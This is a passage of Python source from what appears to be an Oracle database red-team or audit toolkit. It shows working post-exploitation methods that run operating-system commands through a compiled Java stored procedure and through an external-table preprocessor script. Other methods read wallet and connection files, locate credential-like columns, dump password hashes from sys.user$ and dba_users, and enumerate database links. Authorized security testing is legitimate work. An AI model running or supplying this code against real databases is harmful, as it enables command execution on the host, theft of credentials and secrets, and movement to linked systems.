            self.execute("create or replace and compile java source named RedpostureExec as " + source)
            self.execute(
                "create or replace function redposture_java_exec(cmd varchar2) return varchar2 "
                "as language java name 'RedpostureExec.run(java.lang.String) return java.lang.String'"
            )
            rows = self.query("select redposture_java_exec(:cmd) as output from dual", {"cmd": command}, limit=1)
            output = rows[0].get("output") if rows else ""
            return {"ok": True, "output": output, "output_available": True, "error": None}
        except Exception as exc:
            return {"ok": False, "output": None, "output_available": False, "error": normalize_oracle_error(exc)}

    def external_table_exec(self, command: str) -> dict[str, Any]:
        table_name = f"REDPOSTURE_EXT_{uuid.uuid4().hex[:10].upper()}"
        script_name = f"rp_ext_{uuid.uuid4().hex[:10]}.sh"
        location_name = f"rp_ext_{uuid.uuid4().hex[:10]}.dat"
        script = "#!/bin/sh\n" + str(command) + "\n"
        try:
            stage = self._data_pump_directory()
            stage_dir = str(stage.get("directory_path") or "").rstrip("/")
            script_write = self.os_write(script_name, script, fs_mode="directory")
            location_write = self.os_write(location_name, "x\n", fs_mode="directory")
            if not script_write.get("ok") or not location_write.get("ok"):
                return {
                    "ok": False,
                    "output": None,
                    "output_available": False,
                    "error": script_write.get("error") or location_write.get("error"),
                }
            chmod = self.scheduler_exec(f"chmod 700 -- {shlex.quote(stage_dir + '/' + script_name)}")
            if not chmod.get("ok"):
                return {"ok": False, "output": None, "output_available": False, "error": chmod.get("error")}
            self.execute(
                f"create table {table_name} (line varchar2(4000)) organization external "
                "(type oracle_loader default directory DATA_PUMP_DIR access parameters "
                f"(records delimited by newline preprocessor DATA_PUMP_DIR:'{script_name}' fields terminated by X'09') "
                f"location ('{location_name}')) reject limit unlimited"
            )
            rows = self.query(f"select line from {table_name}", limit=200)
            output = "\n".join(str(row.get("line") or "") for row in rows)
            return {
                "ok": True,
                "output": output,
                "output_available": True,
                "table_name": table_name,
                "script_name": script_name,
                "location_name": location_name,
                "error": None,
            }
        except Exception as exc:
            return {"ok": False, "output": None, "output_available": False, "error": normalize_oracle_error(exc)}
        finally:
            try:
                self.execute(f"drop table {table_name} purge")
            except Exception:
                pass
            for item in (script_name, location_name):
                try:
                    self.os_delete(item, fs_mode="directory")
                except Exception:
                    pass

    def dbms_cloud_exec(self, command: str) -> dict[str, Any]:
        try:
            rows = self.query(
                "select owner, object_name, object_type from all_objects where object_name='DBMS_CLOUD'",
                limit=20,
            )
        except Exception as exc:
            return {
                "ok": False,
                "output": None,
                "output_available": False,
                "capability_present": None,
                "error": normalize_oracle_error(exc),
                "command": command,
            }
        if not rows:
            return {
                "ok": False,
                "output": None,
                "output_available": False,
                "capability_present": False,
                "error": "DBMS_CLOUD package is not visible in this database",
                "command": command,
            }
        return {
            "ok": False,
            "output": None,
            "output_available": False,
            "capability_present": True,
            "objects": rows,
            "error": "DBMS_CLOUD is present, but OS command execution requires cloud-specific credentials/procedures",
            "command": command,
        }

    def wallet_artifacts(self, *, max_bytes: int = 32767) -> list[dict[str, Any]]:
        names = ("cwallet.sso", "ewallet.p12", "sqlnet.ora", "tnsnames.ora", "redposture_wallet_hint.txt")
        artifacts: list[dict[str, Any]] = []
        seen: set[tuple[str, str]] = set()
        for directory in self.list_directories():
            directory_name = str(directory.get("directory_name") or "").upper()
            directory_path = str(directory.get("directory_path") or "").rstrip("/")
            if not directory_name:
                continue
            for name in names:
                key = (directory_name, name)
                if key in seen:
                    continue
                seen.add(key)
                candidate_paths = [f"{directory_path}/{name}" if directory_path else name]
                if name not in candidate_paths:
                    candidate_paths.append(name)
                for candidate_path in candidate_paths:
                    result = self.os_read(candidate_path, max_bytes=max_bytes)
                    if not result.get("ok"):
                        continue
                    artifacts.append(
                        {
                            "directory": directory_name,
                            "directory_path": directory_path,
                            "file_name": name,
                            "path": candidate_path,
                            "method": result.get("method"),
                            "data": result.get("data"),
                            "bytes": len(str(result.get("data") or "").encode("utf-8")),
                        }
                    )
                    break
        return artifacts

    def sensitive_scan(self) -> list[dict[str, Any]]:
        patterns = ["%PASSWORD%", "%TOKEN%", "%SECRET%", "%API%KEY%", "%SSN%", "%EMAIL%"]
        findings: list[dict[str, Any]] = []
        for pattern in patterns:
            try:
                findings.extend(
                    self.query(
                        "select owner, table_name, column_name from all_tab_columns where upper(column_name) like :pattern order by owner, table_name, column_name",
                        {"pattern": pattern},
                        limit=200,
                    )
                )
            except Exception:
                continue
        return findings

    def password_hashes(self) -> list[dict[str, Any]]:
        for sql in (
            "select name, spare4 from sys.user$ where spare4 is not null",
            "select username, password_versions from dba_users where password_versions is not null",
        ):
            try:
                rows = self.query(sql, limit=500)
                if rows:
                    return rows
            except Exception:
                continue
        return []

    def db_links(self) -> list[dict[str, Any]]:
        for sql in (
            "select owner, db_link, username, host from dba_db_links order by owner, db_link",
            "select db_link, username, host from user_db_links order by db_link",
        ):
            try:
                rows = self.query(sql, limit=500)
                if rows:
                    return rows
            except Exception:
                continue
        return []


def close_quietly(client_or_connection: Any) -> None:
    try:
        close = getattr(client_or_connection, "close", None)
        if callable(close):
            close()
    except Exception:
        return


__all__ = [
    "OracleAccountExpiredError",
    "OracleAccountLockedError",
    "OracleAuditClient",
    "OracleAuthError",
    "OracleClientError",
    "OracleConnectConfig",
    "OracleDependencyError",
    "OracleNotOracleError",
    "OracleServiceError",
    "OracleTnsError",
    "build_oracle_dsn",
    "build_tns_connect_packet",
    "classify_oracle_error",
    "classify_nne_policy",
    "close_quietly",
    "connect_oracle",
    "json_safe",
    "normalize_oracle_error",
    "parse_listener_dump",
    "parse_tns_packet",
    "tns_listener_command",
]
